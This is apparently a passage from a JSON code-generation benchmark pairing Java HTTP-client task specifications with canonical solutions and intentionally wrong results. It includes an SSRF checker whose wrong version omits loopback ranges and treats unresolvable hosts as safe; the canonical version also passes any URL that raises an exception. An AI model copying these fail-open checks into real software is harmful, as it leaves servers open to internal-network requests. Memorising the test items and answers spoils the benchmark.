    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic final class HttpURLConnectionUtils {\n\n    private static final String TAG = HttpURLConnectionUtils.class.getSimpleName();\n    private static final int TIMEOUT_IN_MILLIONS = 5000;\n    public static final String BAIDU_URL = \"https://www.baidu.com\";\n\n    public interface Callback {\n        void onResponse(String result, long response);\n        void onFail(Throwable error);\n    }\n\n    public interface TimeCallback {\n        void onResponse(long millis);\n        void onFail(Throwable error);\n    }\n\n    public static void doGetAsync(final String urlStr, final Callback callback) {\n        new Thread(() -> {\n            try {\n                request(\"GET\", urlStr, null, null, callback);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public static void doPostAsync(final String urlStr, final String params, final Callback callback) {\n        new Thread(() -> {\n            try {\n                request(\"POST\", urlStr, null, params, callback);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public static void getNetTime(final TimeCallback callback) {\n        getNetTime(BAIDU_URL, callback);\n    }\n\n    public static void getNetTime(final String urlStr, final TimeCallback callback) {\n        new Thread(() -> reqNetTime(urlStr, callback)).start();\n    }\n\n    private static void request(\n            final String method,\n            final String urlStr,\n            final Map<String, String> headers,\n            final String params,\n            final Callback callback\n    ) {\n        HttpURLConnection connection = null;\n        InputStream is = null;\n        ByteArrayOutputStream baos = null;\n        try {\n            URL url = new URL(urlStr);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(method);\n            \n            if (headers != null) {\n                for (Map.Entry<String, String> entry : headers.entrySet()) {\n                    connection.setRequestProperty(entry.getKey(), entry.getValue());\n                }\n            }\n            \n            if (params != null && params.length() != 0) {\n                connection.setDoInput(true);\n                connection.setDoOutput(true);\n                connection.setUseCaches(false);\n                OutputStream os = connection.getOutputStream();\n                os.write(params.getBytes());\n                os.flush();\n                os.close();\n            }\n            \n            connection.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n            connection.setReadTimeout(TIMEOUT_IN_MILLIONS);\n            \n            int responseCode = connection.getResponseCode();\n            if (responseCode >= 200 && responseCode < 300) {\n                is = connection.getInputStream();\n                baos = new ByteArrayOutputStream();\n                byte[] buffer = new byte[1024];\n                int len;\n                while (((len = is.read(buffer)) != -1)) {\n                    baos.write(buffer, 0, len);\n                }\n                String result = baos.toString();\n                if (callback != null) {\n                    callback.onResponse(result, connection.getDate());\n                }\n            } else {\n                if (callback != null) {\n                    callback.onFail(new Exception(\"responseCode not >= 200 or < 300, code: \" + responseCode));\n                }\n            }\n        } catch (Exception e) {\n            if (callback != null) {\n                callback.onFail(e);\n            }\n        } finally {\n            try {\n                if (baos != null) baos.close();\n                if (is != null) is.close();\n            } catch (Exception ignore) {}\n            \n            if (connection != null) {\n                try {\n                    connection.disconnect();\n                } catch (Exception ignore) {}\n            }\n        }\n    }\n\n    private static void reqNetTime(final String urlStr, final TimeCallback callback) {\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(urlStr);\n            connection = (HttpURLConnection) url.openConnection();\n            long date = connection.getDate();\n            if (date <= 0) {\n                date = -1L;\n            }\n            if (callback != null) {\n                callback.onResponse(date);\n            }\n        } catch (Exception e) {\n            if (callback != null) {\n                callback.onFail(e);\n            }\n        } finally {\n            if (connection != null) {\n                try {\n                    connection.disconnect();\n                } catch (Exception ignore) {}\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpURLConnectionUtils {\n    public static final String TAG = \"HttpURLConnectionUtils\";\n    public static final int TIMEOUT_IN_MILLIONS = 5000;\n    public static final String BAIDU_URL = \"https://www.baidu.com\";\n\n    public interface Callback {\n        void onResponse(String result, long response);\n        void onFail(Throwable error);\n    }\n\n    public interface TimeCallback {\n        void onResponse(long millis);\n        void onFail(Throwable error);\n    }\n\n    public void doGetAsync(String urlStr, Callback callback) {\n        request(\"GET\", urlStr, null, null, callback);\n    }\n\n    public void doPostAsync(String urlStr, String params, Callback callback) {\n        request(\"POST\", urlStr, null, params, callback);\n    }\n\n    public void getNetTime(TimeCallback callback) {\n        reqNetTime(BAIDU_URL, callback);\n    }\n\n    public void getNetTime(String urlStr, TimeCallback callback) {\n        reqNetTime(urlStr, callback);\n    }\n\n    private void request(String method, String urlStr, Map<String, String> headers, String params, Callback callback) {\n        new Thread(() -> {\n            try {\n                URL url = new URL(urlStr);\n                HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n                conn.setRequestMethod(method);\n                conn.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n                conn.setReadTimeout(TIMEOUT_IN_MILLIONS);\n\n                if (headers != null) {\n                    for (Map.Entry<String, String> entry : headers.entrySet()) {\n                        conn.setRequestProperty(entry.getKey(), entry.getValue());\n                    }\n                }\n\n                if (method.equals(\"POST\")) {\n                    conn.setDoOutput(true);\n                    conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                    try (OutputStream os = conn.getOutputStream()) {\n                        os.write(params.getBytes(StandardCharsets.UTF_8));\n                    }\n                }\n\n                int responseCode = conn.getResponseCode();\n                if (responseCode == HttpURLConnection.HTTP_OK) {\n                    StringBuilder response = new StringBuilder();\n                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n                        String line;\n                        while ((line = reader.readLine()) != null) {\n                            response.append(line);\n                        }\n                    }\n                    callback.onResponse(response.toString(), (long) responseCode);\n                } else {\n                    StringBuilder errorResponse = new StringBuilder();\n                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getErrorStream()))) {\n                        String line;\n                        while ((line = reader.readLine()) != null) {\n                            errorResponse.append(line);\n                        }\n                    }\n                    callback.onFail(new IOException(\"Server returned code \" + responseCode + \": \" + errorResponse));\n                }\n            } catch (Exception e) {\n                callback.onFail(e);\n            }\n        }).start();\n    }\n\n    private void reqNetTime(String urlStr, TimeCallback callback) {\n        new Thread(() -> {\n            try {\n                URL url = new URL(urlStr);\n                HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n                conn.setRequestMethod(\"GET\");\n                conn.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n                conn.setReadTimeout(TIMEOUT_IN_MILLIONS);\n\n                int responseCode = conn.getResponseCode();\n                if (responseCode == HttpURLConnection.HTTP_OK) {\n                    StringBuilder response = new StringBuilder();\n                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n                        String line;\n                        while ((line = reader.readLine()) != null) {\n                            response.append(line);\n                        }\n                    }\n                    long timeMillis = Long.parseLong(response.toString());\n                    callback.onResponse(timeMillis);\n                } else {\n                    callback.onFail(new IOException(\"Server returned code \" + responseCode));\n                }\n            } catch (Exception e) {\n                callback.onFail(e);\n            }\n        }).start();\n    }\n}"
  },
  {
    "Task_id": 91,
    "Instruction": "Task Description: Implement a Java class for SSRF (Server-Side Request Forgery) security checks that validates URLs to prevent internal network access.\n\nClass Description: The SSRFChecker class provides functionality to check if a given URL is safe by verifying it doesn't resolve to internal IP addresses. It includes methods for URL validation, host extraction, IP resolution, and internal IP detection.\n\nAttributes:\n- logger: Logger - Used for logging error and info messages\n- decimalIp: String - Stores converted IP address in decimal format\n\nMethods:\n- checkSSRF(String url, int checkTimes) -> boolean - Main method to validate URL against SSRF risks. Follows redirects up to checkTimes. Returns true if safe, false if dangerous.\n- isInternalIpByUrl(String url) -> boolean - Checks if URL's host resolves to an internal IP. Returns true if internal/dangerous.\n- isInternalIp(String strIP) -> boolean - Verifies if given IP is in blocked subnets. Returns true if IP is internal.\n- host2ip(String host) -> String - Resolves hostname to IP address. Returns empty string on failure.\n- url2host(String url) -> String - Extracts host from URL. Returns empty string for non-HTTP URLs or invalid URLs.\n- isOctalIP(String host) -> boolean - (Private) Checks if host is in octal IP format. Returns true if octal format detected.",
    "Canonical_solution": "import java.net.HttpURLConnection;\nimport java.net.InetAddress;\nimport java.net.URI;\nimport java.net.URL;\nimport java.util.ArrayList;\n\nimport org.apache.commons.lang.StringUtils;\nimport org.apache.commons.net.util.SubnetUtils;\nimport org.joychou.config.WebConfig;\nimport org.joychou.security.SecurityUtil;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class SSRFChecker {\n\n    private static final Logger logger = LoggerFactory.getLogger(SSRFChecker.class);\n    private static String decimalIp;\n\n    public static boolean checkSSRF(String url, int checkTimes) {\n        HttpURLConnection connection;\n        int connectTime = 5 * 1000;\n        int i = 1;\n        String finalUrl = url;\n        try {\n            do {\n                if (isInternalIpByUrl(finalUrl)) {\n                    logger.error(\"[-] SSRF check failed. Dangerous url: \" + finalUrl);\n                    return false;\n                }\n\n                connection = (HttpURLConnection) new URL(finalUrl).openConnection();\n                connection.setInstanceFollowRedirects(false);\n                connection.setUseCaches(false);\n                connection.setConnectTimeout(connectTime);\n                connection.connect();\n                int responseCode = connection.getResponseCode();\n                if (responseCode >= 300 && responseCode <= 307 && responseCode != 304 && responseCode != 306) {\n                    String redirectedUrl = connection.getHeaderField(\"Location\");\n                    if (null == redirectedUrl)\n                        break;\n                    finalUrl = redirectedUrl;\n                    i += 1;\n                    logger.info(\"redirected url: \" + finalUrl);\n                    if (i == checkTimes) {\n                        return false;\n                    }\n                } else\n                    break;\n            } while (connection.getResponseCode() != HttpURLConnection.HTTP_OK);\n            connection.disconnect();\n        } catch (Exception e) {\n            return true;\n        }\n        return true;\n    }\n\n    public static boolean isInternalIpByUrl(String url) {\n        String host = url2host(url);\n        if (host.equals(\"\")) {\n            return true;\n        }\n\n        String ip = host2ip(host);\n        if (ip.equals(\"\")) {\n            return true;\n        }\n\n        return isInternalIp(ip);\n    }\n\n    public static boolean isInternalIp(String strIP) {\n        if (StringUtils.isEmpty(strIP)) {\n            logger.error(\"[-] SSRF check failed. IP is empty. \" + strIP);\n            return true;\n        }\n\n        ArrayList<String> blackSubnets = WebConfig.getSsrfBlockIps();\n        for (String subnet : blackSubnets) {\n            SubnetUtils utils = new SubnetUtils(subnet);\n            if (utils.getInfo().isInRange(strIP)) {\n                logger.error(\"[-] SSRF check failed. Internal IP: \" + strIP);\n                return true;\n            }\n        }\n\n        return false;\n    }\n\n    public static String host2ip(String host) {\n        if (null == host) {\n            return \"\";\n        }\n\n        if(isOctalIP(host)) {\n            host = decimalIp;\n        }\n\n        try {\n            InetAddress IpAddress = InetAddress.getByName(host);\n            return IpAddress.getHostAddress();\n        } catch (Exception e) {\n            logger.error(\"host2ip exception \" + e.getMessage());\n            return \"\";\n        }\n    }\n\n    private static String url2host(String url) {\n        try {\n            URI u = new URI(url);\n            if (SecurityUtil.isHttp(url)) {\n                return u.getHost();\n            }\n            return \"\";\n        } catch (Exception e) {\n            return \"\";\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.net.URL;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.net.HttpURLConnection;\nimport java.util.logging.Logger;\n\npublic class SSRFChecker {\n    private static final Logger logger = Logger.getLogger(SSRFChecker.class.getName());\n    private String decimalIp;\n\n    public boolean checkSSRF(String url, int checkTimes) {\n        String currentUrl = url;\n        for (int i = 0; i < checkTimes; i++) {\n            String host = url2host(currentUrl);\n            if (host.isEmpty()) {\n                logger.severe(\"Invalid URL: \" + currentUrl);\n                return false;\n            }\n            String resolvedIp = host2ip(host);\n            if (resolvedIp.isEmpty()) {\n                logger.severe(\"Could not resolve host: \" + host);\n                return false;\n            }\n            if (isInternalIp(resolvedIp)) {\n                logger.warning(\"Internal IP detected: \" + resolvedIp);\n                return false;\n            }\n            try {\n                URL urlObj = new URL(currentUrl);\n                HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();\n                conn.setRequestMethod(\"GET\");\n                int responseCode = conn.getResponseCode();\n                if (responseCode >= 300 && responseCode < 400) {\n                    String location = conn.getHeaderField(\"Location\");\n                    if (location != null) {\n                        currentUrl = location;\n                    } else {\n                        break;\n                    }\n                } else {\n                    break;\n                }\n            } catch (Exception e) {\n                logger.severe(\"Error checking redirect for URL: \" + currentUrl);\n                return false;\n            }\n        }\n        return true;\n    }\n\n    private boolean isInternalIpByUrl(String url) {\n        String host = url2host(url);\n        if (host.isEmpty()) {\n            return false;\n        }\n        String resolvedIp = host2ip(host);\n        if (resolvedIp.isEmpty()) {\n            return false;\n        }\n        return isInternalIp(resolvedIp);\n    }\n\n    private boolean isInternalIp(String strIP) {\n        if (!isValidIPv4(strIP)) {\n            return false;\n        }\n        long ipLong = ipToLong(strIP);\n        return (ipLong >= 0x0A000000 && ipLong <= 0x0AFFFFFF) || \n               (ipLong >= 0xAC100000 && ipLong <= 0xAC1FFFFF) || \n               (ipLong >= 0xC0A80000 && ipLong <= 0xC0A8FFFF);\n    }\n\n    private String host2ip(String host) {\n        try {\n            InetAddress inet = InetAddress.getByName(host);\n            if (inet instanceof Inet4Address) {\n                return inet.getHostAddress();\n            } else {\n                return \"\";\n            }\n        } catch (UnknownHostException e) {\n            logger.severe(\"Unknown host: \" + host);\n            return \"\";\n        }\n    }\n\n    private String url2host(String url) {\n        try {\n            URL u = new URL(url);\n            return u.getHost();\n        } catch (Exception e) {\n            logger.severe(\"Invalid URL: \" + url);\n            return \"\";\n        }\n    }\n\n    private boolean isOctalIP(String host) {\n        if (host == null || host.isEmpty()) return false;\n        String[] parts = host.split(\"\\\\.\");\n        for (String part : parts) {\n            if (part.length() == 0) return false;\n            for (char c : part.toCharArray()) {\n                if (c < '0' || c > '7') return false;\n            }\n        }\n        return true;\n    }\n\n    private boolean isValidIPv4(String ip) {\n        if (ip == null || ip.isEmpty()) return false;\n        String[] parts = ip.split(\"\\\\.\");\n        if (parts.length != 4) return false;\n        for (String part : parts) {\n            if (part.isEmpty()) return false;\n            try {\n                int num = Integer.parseInt(part);\n                if (num < 0 || num > 255) return false;\n            } catch (NumberFormatException e) {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    private long ipToLong(String ip) {\n        String[] parts = ip.split(\"\\\\.\");\n        long result = 0;\n        for (int i = 0; i < 4; i++) {\n            result = (result << 8) | Integer.parseInt(parts[i]);\n        }\n        return result;\n    }\n}"
  },
  {
    "Task_id": 93,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests with support for proxy configuration, including making GET requests, processing responses, and handling callbacks for success and failure scenarios.\n\nClass Description: The HttpRequestManager class manages HTTP requests with configurable proxy settings. It provides functionality to make GET requests to a specified URL, process the response (including Base64 decoding), and notify the caller of success or failure through a callback interface.\n\nAttributes:\n- mProxyOn: boolean - Indicates whether proxy is enabled\n- mProxyHost: String - The host address of the proxy server\n- mProxyPort: long - The port number of the proxy server\n\nMethods:\n- HttpRequestManager(boolean proxyOn, String proxyHost, long proxyPort) -> void - Constructor that initializes proxy configuration\n- requestSubscribeServerConfigs(String urlStr, Callback callback) -> void - Makes a GET request to the specified URL and processes the response, notifying through callback\n- readStringFromStream(InputStream inputStream) -> String - Helper method to read and convert an InputStream to a String\n- interface Callback - Nested interface for handling request results\n  - onSuccess(String response) -> void - Called when request succeeds\n  - onFailed() -> void - Called when request fails",
    "Canonical_solution": "import android.net.Uri;\nimport android.text.TextUtils;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.Reader;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.MalformedURLException;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Objects;\n\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class HttpRequestManager {\n    private boolean mProxyOn;\n    private String mProxyHost;\n    private long mProxyPort;\n\n    public HttpRequestManager(boolean proxyOn, String proxyHost, long proxyPort) {\n        mProxyOn = proxyOn;\n        mProxyHost = proxyHost;\n        mProxyPort = proxyPort;\n    }\n\n    public void requestSubscribeServerConfigs(String urlStr, @NonNull Callback callback) {\n        URL url;\n        try {\n            url = new URL(urlStr);\n        } catch (MalformedURLException e) {\n            e.printStackTrace();\n            callback.onFailed();\n            return;\n        }\n        HttpURLConnection connection = null;\n        try {\n            if (mProxyOn) {\n                InetSocketAddress proxyAddress = new InetSocketAddress(mProxyHost, (int) mProxyPort);\n                Proxy proxy = new Proxy(Proxy.Type.SOCKS, proxyAddress);\n                connection = (HttpURLConnection) url.openConnection(proxy);\n            } else {\n                connection = (HttpURLConnection) url.openConnection();\n            }\n            connection.setReadTimeout(10000);\n            connection.setConnectTimeout(10000);\n            connection.setRequestMethod(\"GET\");\n            connection.setDoInput(true);\n            connection.connect();\n            int responseCode = connection.getResponseCode();\n            if (responseCode != HttpsURLConnection.HTTP_OK) {\n                callback.onFailed();\n                return;\n            }\n            try (InputStream stream = connection.getInputStream()) {\n                if (stream != null) {\n                    @Nullable String response = DecodeUtils.decodeBase64(readStringFromStream(stream));\n                    if (TextUtils.isEmpty(response)) {\n                        callback.onFailed();\n                    } else {\n                        callback.onSuccess(response);\n                    }\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            callback.onFailed();\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n\n    private String readStringFromStream(InputStream inputStream) {\n        try (Reader reader = new InputStreamReader(inputStream, StandardCharsets.UTF_8)) {\n            char[] buf = new char[4096];\n            StringBuilder sb = new StringBuilder();\n            int readSize;\n            while ((readSize = reader.read(buf)) != -1) {\n                sb.append(buf, 0, readSize);\n            }\n            return sb.toString();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    public interface Callback {\n        void onSuccess(String response);\n        void onFailed();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.net.Proxy;\nimport java.net.ProxySelector;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.io.InputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.util.Base64;\nimport java.nio.charset.StandardCharsets;\nimport java.net.InetSocketAddress;\n\npublic class HttpRequestManager {\n    private boolean mProxyOn;\n    private String mProxyHost;\n    private long mProxyPort;\n\n    public HttpRequestManager(boolean proxyOn, String proxyHost, long proxyPort) {\n        this.mProxyOn = proxyOn;\n        this.mProxyHost = proxyHost;\n        this.mProxyPort = proxyPort;\n    }\n\n    public void requestSubscribeServerConfigs(String urlStr, Callback callback) {\n        try {\n            HttpClient client = HttpClient.newBuilder().build();\n            if (mProxyOn) {\n                ProxySelector proxySelector = ProxySelector.of(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(mProxyHost, mProxyPort)));\n                client = HttpClient.newBuilder()\n                    .proxy(proxySelector)\n                    .build();\n            }\n\n            HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(urlStr))\n                .GET()\n                .build();\n\n            HttpResponse<InputStream> response = client.send(request, HttpResponse.BodyHandlers.ofInputStream());\n\n            if (response.statusCode() == 200) {\n                String responseBody = readStringFromStream(response.body());\n                callback.onSuccess(responseBody);\n            } else {\n                callback.onFailed();\n            }\n        } catch (IOException | InterruptedException e) {\n            callback.onFailed();\n        }\n    }\n\n    private String readStringFromStream(InputStream inputStream) {\n        try {\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                baos.write(buffer, 0, bytesRead);\n            }\n            byte[] allBytes = baos.toByteArray();\n            byte[] decodedBytes = Base64.getDecoder().decode(allBytes);\n            return new String(decodedBytes, StandardCharsets.UTF_8);\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public interface Callback {\n        void onSuccess(String response);\n        void onFailed();\n    }\n}"
  },
  {
    "Task_id": 94,
    "Instruction": "Task Description: Implement a lightweight HTTP client class in Java that can perform GET and POST requests with configurable headers, parameters, and timeouts.\n\nClass Description: HttpTinyClient is a utility class that provides basic HTTP GET and POST functionality using Java's HttpURLConnection. It handles URL parameter encoding, header management, and response processing.\n\nAttributes:\nNone (This is a utility class with only static methods)\n\nMethods:\n\nMethod1: httpGet(String url, List<String> headers, List<String> paramValues, String encoding, long readTimeoutMs) -> HttpResult - Performs an HTTP GET request to the specified URL with given headers and parameters. Encodes parameters in the URL query string.\n\nMethod2: httpPost(String url, List<String> headers, List<String> paramValues, String encoding, long readTimeoutMs) -> HttpResult - Performs an HTTP POST request to the specified URL with given headers and parameters. Encodes parameters in the request body.\n\nMethod3: encodingParams(List<String> paramValues, String encoding) -> String - Helper method that encodes parameter values for URL or POST body using the specified character encoding.\n\nMethod4: setHeaders(HttpURLConnection conn, List<String> headers, String encoding) -> void - Helper method that sets request headers including default headers for content type and client version.\n\nNested Class: HttpResult - Represents the result of an HTTP request with status code and response content.\n\nAttributes:\ncode: int - HTTP response status code\ncontent: String - Response body content",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.UnsupportedEncodingException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.util.Iterator;\nimport java.util.List;\nimport org.apache.rocketmq.common.MQVersion;\nimport org.apache.rocketmq.common.MixAll;\n\npublic class HttpTinyClient {\n\n    static public HttpResult httpGet(String url, List<String> headers, List<String> paramValues,\n        String encoding, long readTimeoutMs) throws IOException {\n        String encodedContent = encodingParams(paramValues, encoding);\n        url += (null == encodedContent) ? \"\" : (\"?\" + encodedContent);\n\n        HttpURLConnection conn = null;\n        try {\n            conn = (HttpURLConnection) new URL(url).openConnection();\n            conn.setRequestMethod(\"GET\");\n            conn.setConnectTimeout((int) readTimeoutMs);\n            conn.setReadTimeout((int) readTimeoutMs);\n            setHeaders(conn, headers, encoding);\n\n            conn.connect();\n            int respCode = conn.getResponseCode();\n            String resp = null;\n\n            if (HttpURLConnection.HTTP_OK == respCode) {\n                resp = IOTinyUtils.toString(conn.getInputStream(), encoding);\n            } else {\n                resp = IOTinyUtils.toString(conn.getErrorStream(), encoding);\n            }\n            return new HttpResult(respCode, resp);\n        } finally {\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n    }\n\n    static private String encodingParams(List<String> paramValues, String encoding)\n        throws UnsupportedEncodingException {\n        StringBuilder sb = new StringBuilder();\n        if (null == paramValues) {\n            return null;\n        }\n\n        for (Iterator<String> iter = paramValues.iterator(); iter.hasNext(); ) {\n            sb.append(iter.next()).append(\"=\");\n            sb.append(URLEncoder.encode(iter.next(), encoding));\n            if (iter.hasNext()) {\n                sb.append(\"&\");\n            }\n        }\n        return sb.toString();\n    }\n\n    static private void setHeaders(HttpURLConnection conn, List<String> headers, String encoding) {\n        if (null != headers) {\n            for (Iterator<String> iter = headers.iterator(); iter.hasNext(); ) {\n                conn.addRequestProperty(iter.next(), iter.next());\n            }\n        }\n        conn.addRequestProperty(\"Client-Version\", MQVersion.getVersionDesc(MQVersion.CURRENT_VERSION));\n        conn.addRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded;charset=\" + encoding);\n\n        String ts = String.valueOf(System.currentTimeMillis());\n        conn.addRequestProperty(\"Metaq-Client-RequestTS\", ts);\n    }\n\n    static public HttpResult httpPost(String url, List<String> headers, List<String> paramValues,\n        String encoding, long readTimeoutMs) throws IOException {\n        String encodedContent = encodingParams(paramValues, encoding);\n\n        HttpURLConnection conn = null;\n        try {\n            conn = (HttpURLConnection) new URL(url).openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setConnectTimeout(3000);\n            conn.setReadTimeout((int) readTimeoutMs);\n            conn.setDoOutput(true);\n            conn.setDoInput(true);\n            setHeaders(conn, headers, encoding);\n\n            conn.getOutputStream().write(encodedContent.getBytes(MixAll.DEFAULT_CHARSET));\n\n            int respCode = conn.getResponseCode();\n            String resp = null;\n\n            if (HttpURLConnection.HTTP_OK == respCode) {\n                resp = IOTinyUtils.toString(conn.getInputStream(), encoding);\n            } else {\n                resp = IOTinyUtils.toString(conn.getErrorStream(), encoding);\n            }\n            return new HttpResult(respCode, resp);\n        } finally {\n            if (null != conn) {\n                conn.disconnect();\n            }\n        }\n    }\n\n    static public class HttpResult {\n        final public int code;\n        final public String content;\n\n        public HttpResult(int code, String content) {\n            this.code = code;\n            this.content = content;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.IOException;\nimport java.util.List;\n\npublic class HttpTinyClient {\n    private static class HttpResult {\n        public final int code;\n        public final String content;\n\n        public HttpResult(int code, String content) {\n            this.code = code;\n            this.content = content;\n        }\n    }\n\n    public static String encodingParams(List<String> paramValues, String encoding) {\n        StringBuilder sb = new StringBuilder();\n        for (String param : paramValues) {\n            int eqIdx = param.indexOf('=');\n            if (eqIdx == -1) {\n                continue;\n            }\n            String key = param.substring(0, eqIdx);\n            String value = param.substring(eqIdx + 1);\n            try {\n                String encodedValue = URLEncoder.encode(value, encoding);\n                if (sb.length() > 0) {\n                    sb.append('&');\n                }\n                sb.append(key).append('=').append(encodedValue);\n            } catch (UnsupportedEncodingException e) {\n                return \"\";\n            }\n        }\n        return sb.toString();\n    }\n\n    public static void setHeaders(HttpURLConnection conn, List<String> headers, String encoding) {\n        conn.setRequestProperty(\"User-Agent\", \"HttpTinyClient/1.0\");\n        conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        for (String header : headers) {\n            String[] parts = header.split(\":\\\\s*\", 2);\n            if (parts.length == 2) {\n                conn.setRequestProperty(parts[0], parts[1]);\n            }\n        }\n    }\n\n    public static HttpResult httpGet(String url, List<String> headers, List<String> paramValues, String encoding, long readTimeoutMs) {\n        try {\n            String encodedParams = encodingParams(paramValues, encoding);\n            String fullUrl = url + (encodedParams.isEmpty() ? \"\" : \"?\" + encodedParams);\n            HttpURLConnection conn = (HttpURLConnection) new URL(fullUrl).openConnection();\n            setHeaders(conn, headers, encoding);\n            conn.setReadTimeout((int) readTimeoutMs);\n            conn.setConnectTimeout(5000);\n            int responseCode = conn.getResponseCode();\n            String content = readResponse(conn);\n            return new HttpResult(responseCode, content);\n        } catch (Exception e) {\n            return new HttpResult(500, \"\");\n        }\n    }\n\n    public static HttpResult httpPost(String url, List<String> headers, List<String> paramValues, String encoding, long readTimeoutMs) {\n        try {\n            String encodedParams = encodingParams(paramValues, encoding);\n            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();\n            setHeaders(conn, headers, encoding);\n            conn.setRequestMethod(\"POST\");\n            conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n            conn.setRequestProperty(\"Content-Length\", String.valueOf(encodedParams.length()));\n            conn.setDoOutput(true);\n            conn.setReadTimeout((int) readTimeoutMs);\n            conn.setConnectTimeout(5000);\n            try (OutputStream os = conn.getOutputStream()) {\n                os.write(encodedParams.getBytes(encoding));\n                os.flush();\n            }\n            int responseCode = conn.getResponseCode();\n            String content = readResponse(conn);\n            return new HttpResult(responseCode, content);\n        } catch (Exception e) {\n            return new HttpResult(500, \"\");\n        }\n    }\n\n    private static String readResponse(HttpURLConnection conn) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line);\n            }\n        } catch (IOException e) {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getErrorStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    sb.append(line);\n                }\n            }\n        }\n        return sb.toString();\n    }\n}"
  },
  {
    "Task_id": 95,
    "Instruction": "Task Description: Create a utility class for handling HTTP POST requests with multipart form data, including both text fields and file uploads, using Java's HttpURLConnection.\n\nClass Description: HttpPostUploadUtil is a utility class designed to simplify the process of sending HTTP POST requests with multipart/form-data content type. It handles both text parameters and file uploads, manages connection timeouts, and properly formats the multipart request body.\n\nAttributes:\n- logger: Logger - Used for logging errors and debug information\n- BOUNDARY: String - A constant string used as the boundary for multipart form data (defined within the method)\n\nMethods:\n- formUpload(String urlStr, int connectTimeout, int readTimeout, Map<String, String> textMap, Map<String, MultipartFile> fileMap) -> String - Performs an HTTP POST request with multipart form data containing both text parameters and files\n  Input:\n    - urlStr: String - The target URL for the POST request\n    - connectTimeout: int - Connection timeout in milliseconds\n    - readTimeout: int - Read timeout in milliseconds\n    - textMap: Map<String, String> - Key-value pairs for text form fields\n    - fileMap: Map<String, MultipartFile> - Key-value pairs for file uploads (key is field name, value is file data)\n  Output:\n    - String - The response body from the server\n\n- closeStream(Closeable closeable) -> void - Helper method to safely close Closeable resources\n  Input:\n    - closeable: Closeable - The resource to be closed\n  Output: None",
